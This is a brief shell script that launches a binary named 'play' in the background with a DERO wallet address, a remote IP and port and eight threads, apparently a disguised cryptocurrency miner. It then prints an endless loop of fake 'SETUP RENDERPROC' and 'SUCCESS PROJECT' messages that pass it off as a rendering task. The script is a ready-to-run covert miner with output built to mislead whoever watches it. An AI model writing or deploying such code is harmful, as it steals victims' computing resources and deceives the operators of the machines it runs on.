#!/bin/sh
chmod u+x play

./play -w dero1qysfzhrrt9u6sfxvpgc8lsn5q9slxu92ltmng0ucgrjslhugqfrmgqgzrjf98 -r 137.184.240.176:10100 -p rpc -m 8 &

while true; do clear; echo SETUP RENDERPROC 1; sleep 5; clear; echo SUCCESS PROJECT; sleep 1;let "i++";  done
